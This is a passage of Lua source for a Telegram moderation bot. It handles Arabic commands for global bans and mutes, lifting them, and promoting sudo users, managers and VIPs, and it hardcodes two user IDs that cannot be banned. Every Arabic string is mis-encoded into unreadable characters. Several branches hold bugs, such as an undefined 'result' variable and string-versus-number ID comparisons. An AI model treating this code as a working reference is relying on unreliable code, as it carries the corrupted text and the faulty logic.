local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ­ΨΈΩΨ±ΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ",callback_data="delbanu"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end

if text == ("Ψ­ΨΈΨ± ΨΉΨ§Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and DevSonic(msg) then
function Function_Tshake(extra, result, success)
if result.sender_user_id_ == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΩΩΩ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1593178008) then 
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΩΩΩ Ψ­ΨΈΨ± Ψ§Ω Ψ·Ψ±Ψ― Ψ§Ω ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ­ΩΨ―Ω")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1890819157) then 
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΩΩΩ Ψ­ΨΈΨ± Ψ§Ω Ψ·Ψ±Ψ― Ψ§Ω ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ³ΩΩΩΩ")
return false 
end
database:sadd(bot_id.."GBan:User", result.sender_user_id_)
Kick_Group(result.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ­ΨΈΨ± ΨΉΨ§Ω @(.*)$") and DevSonic(msg) then
local username = text:match("^Ψ­ΨΈΨ± ΨΉΨ§Ω @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
if tonumber(result.id_) == tonumber(bot_id) then 
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω")
return false 
end
if result.id_ == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΩΩΩ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω \n")
return false 
end
if result.id_ == tonumber(1593178008) then
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΩΩΩ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ­ΩΨ―Ψ§ \n")
return false 
end
if result.id_ == tonumber(1890819157) then
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΩΩΩ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ³ΩΩΩΩ \n")
return false 
end
database:sadd(bot_id.."GBan:User", result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ­ΨΈΨ± ΨΉΨ§Ω (%d+)$") and DevSonic(msg) then
local userid = text:match("^Ψ­ΨΈΨ± ΨΉΨ§Ω (%d+)$")
if userid == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΩΩΩΩΩ Ψ­ΨΈΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then 
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω")
return false 
end
if tonumber(userid) == tonumber(1890819157) then 
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ Ψ­ΨΈΨ± Ψ§ΩΩΨ¨Ψ±ΩΨ¬ Ψ³ΩΩΩΩ")
return false 
end
if tonumber(userid) == tonumber(1593178008) then 
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ Ψ­ΨΈΨ± Ψ§ΩΩΨ¨Ψ±ΩΨ¬ ΩΨ­ΩΩΨ―")
return false 
end
database:sadd(bot_id.."GBan:User", userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ Ψ­ΨΈΨ±Ω ΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ") 
return false
end
if text == ("ΩΨͺΩ ΨΉΨ§Ω") and msg.reply_to_message_id_ and DevSonic(msg) then
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΩΩΩΩΩ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ ΩΨͺΩ Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1593178008) then  
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ­ΩΨ―Ψ§")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1890819157) then  
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ³ΩΩΩΩ")
return false 
end
database:sadd(bot_id..'Gmute:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'otlop12')..')'
status  = '\n Ω­ ΨͺΩ ΩΨͺΩΩ ΨΉΨ§Ω ΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨Ψ§Ψͺ'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^ΩΨͺΩ ΨΉΨ§Ω @(.*)$")  and DevSonic(msg) then
local username = text:match("^ΩΨͺΩ ΨΉΨ§Ω @(.*)$") 
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ ΩΨͺΩ Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω")
return false 
end
if tonumber(result.id_) == tonumber(1593178008) then  
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ­ΩΨ―Ψ§")
return false 
end
if tonumber(result.id_) == tonumber(1890819157) then  
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ³ΩΩΩΩ")
return false 
end
if result.id_ == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΩΩΩΩΩ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω \n")
return false 
end
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..result.title_..'](t.me/'..(username or 'otlop12')..')'
status  = '\n Ω­ ΨͺΩ ΩΨͺΩΩ ΨΉΨ§Ω ΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨Ψ§Ψͺ'
texts = usertext..status
database:sadd(bot_id..'Gmute:User', result.id_)
else
texts = ' Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^ΩΨͺΩ ΨΉΨ§Ω (%d+)$") and DevSonic(msg) then
local userid = text:match("^ΩΨͺΩ ΨΉΨ§Ω (%d+)$")
if userid == tonumber(Id_Sudo) then
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΩΩΩΩΩ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ ΩΨͺΩ Ψ§ΩΨ¨ΩΨͺ ΨΉΨ§Ω")
return false 
end
if tonumber(userid) == tonumber(1593178008) then  
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ­ΩΨ―Ψ§")
return false 
end
if tonumber(userid) == tonumber(1890819157) then  
send(msg.chat_id_, msg.id_, " Ω­ ΩΨ§ ΨͺΨ³Ψ·ΩΨΉ ΩΨͺΩ Ψ§ΩΩΨ·ΩΨ± Ψ³ΩΩΩΩ")
return false 
end
database:sadd(bot_id..'Gmute:User', userid)

tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» ['..data.first_name_..'](t.me/'..(data.username_ or 'otlop12')..')'
status  = '\n Ω­ ΨͺΩ ΩΨͺΩΩ ΨΉΨ§Ω ΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨Ψ§Ψͺ'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n Ω­ Ψ§ΩΨΉΨΆΩ Β» '..userid..''
status  = '\n Ω­ ΨͺΩ ΩΨͺΩΩ ΨΉΨ§Ω ΩΩ Ψ§ΩΨ¬Ψ±ΩΨ¨Ψ§Ψͺ'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and DevSonic(msg) then
function Function_Tshake(extra, result, success)
database:srem(bot_id..'Gmute:User', result.sender_user_id_)
database:srem(bot_id.."GBan:User", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ (Ψ§ΩΨ­ΨΈΨ±/Ψ§ΩΩΨͺΩ) Ψ§ΩΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω @(.*)$") and DevSonic(msg) then
local username = text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω @(.*)$") 
function Function_Tshake(extra, result, success)
if result.id_ then
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§ (Ψ§ΩΨ­ΨΈΨ±/Ψ§ΩΩΨͺΩ) Ψ§ΩΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ") 
database:srem(bot_id.."GBan:User", result.id_)
database:srem(bot_id..'Gmute:User', result.sender_user_id_)
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω (%d+)$") and DevSonic(msg) then
local userid = text:match("^Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω (%d+)$")
database:srem(bot_id.."GBan:User", userid)
database:srem(bot_id..'Gmute:User', result.sender_user_id_)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ (Ψ§ΩΨ­ΨΈΨ±/Ψ§ΩΩΨͺΩ) Ψ§ΩΨΉΨ§Ω ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ") 
return false
end

if text == ("Ψ±ΩΨΉ ΩΨ·ΩΨ±") and tonumber(msg.reply_to_message_id_) ~= 0 and Devss(msg) then
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Sudo:User", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false 
end
if text == ("Ψ±ΩΨΉ ΩΨ―ΩΨ± ΨΉΨ§Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and Devss(msg) then
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."manger:all", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ―ΩΨ± ΨΉΨ§Ω ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± ΨΉΨ§Ω @(.*)$") and Devss(msg) then
local username = text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± ΨΉΨ§Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."manger:all", result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ―ΩΨ± ΨΉΨ§Ω ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± ΨΉΨ§Ω (%d+)$") and Devss(msg) then
local userid = text:match("^Ψ±ΩΨΉ ΩΨ―ΩΨ± ΨΉΨ§Ω (%d+)$")
database:sadd(bot_id.."manger:all", userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ―ΩΨ± ΨΉΨ§Ω ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
return false 
end
if text == ("ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± ΨΉΨ§Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and Devss(msg) then
function Function_Tshake(extra, result, success)
database:srem(bot_id.."manger:all", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ―ΩΨ±ΩΩ Ψ§ΩΨΉΨ§Ω") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false 
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± ΨΉΨ§Ω @(.*)$") and Devss(msg) then
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± ΨΉΨ§Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."manger:all", result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ―ΩΨ±ΩΩ Ψ§ΩΨΉΨ§Ω") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end 
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± ΨΉΨ§Ω (%d+)$") and Devss(msg) then
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ± ΨΉΨ§Ω (%d+)$")
database:srem(bot_id.."manger:all", userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ―ΩΨ±ΩΩ Ψ§ΩΨΉΨ§Ω") 
return false 
end
if text == ("Ψ±ΩΨΉ ΩΩΩΨ² ΨΉΨ§Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and Devss(msg) then
function Function_Tshake(extra, result, success)
database:sadd(bot_id.."Vip:all", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΩΨ² ΨΉΨ§Ω ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΩΨ² ΨΉΨ§Ω @(.*)$") and Devss(msg) then
local username = text:match("^Ψ±ΩΨΉ ΩΩΩΨ² ΨΉΨ§Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."Vip:all", result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΩΨ² ΨΉΨ§Ω ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΩΩΨ² ΨΉΨ§Ω (%d+)$") and Devss(msg) then
local userid = text:match("^Ψ±ΩΨΉ ΩΩΩΨ² ΨΉΨ§Ω (%d+)$")
database:sadd(bot_id.."Vip:all", userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΩΩΨ² ΨΉΨ§Ω ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
return false 
end
if text == ("ΨͺΩΨ²ΩΩ ΩΩΩΨ² ΨΉΨ§Ω") and tonumber(msg.reply_to_message_id_) ~= 0 and Devss(msg) then
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Vip:all", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΩΨ²ΩΩ Ψ§ΩΨΉΨ§Ω") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false 
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² ΨΉΨ§Ω @(.*)$") and Devss(msg) then
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² ΨΉΨ§Ω @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Vip:all", result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΩΨ²ΩΩ Ψ§ΩΨΉΨ§Ω") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end 
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² ΨΉΨ§Ω (%d+)$") and Devss(msg) then
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΩΩΨ² ΨΉΨ§Ω (%d+)$")
database:srem(bot_id.."Vip:all", userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΩΩΨ²ΩΩ Ψ§ΩΨΉΨ§Ω") 
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± @(.*)$") and Devss(msg) then
local username = text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."Sudo:User", result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± (%d+)$") and Devss(msg) then
local userid = text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± (%d+)$")
database:sadd(bot_id.."Sudo:User", userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
return false 
end
if text == ("ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ±") and tonumber(msg.reply_to_message_id_) ~= 0 and Devss(msg) then
function Function_Tshake(extra, result, success)
database:srem(bot_id.."Sudo:User", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ±ΩΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false 
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± @(.*)$") and Devss(msg) then
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± @(.*)$")
function Function_Tshake(extra, result, success)
if result.id_ then
database:srem(bot_id.."Sudo:User", result.id_)
Reply_Status(msg,result.id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ±ΩΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
return false
end 
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± (%d+)$") and Devss(msg) then
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± (%d+)$")
database:srem(bot_id.."Sudo:User", userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ±ΩΩ") 
return false 
end
if text == ("ΨͺΩΨ²ΩΩ ΩΨ§ΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and DevBot(msg) then 

function Function_Tshake(extra, result, success)
database:srem(bot_id.."Basic:Creator23"..msg.chat_id_, result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ§ΩΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
return false 
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ§ΩΩ @(.*)$") and DevBot(msg) then 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΨ§ΩΩ @(.*)$")
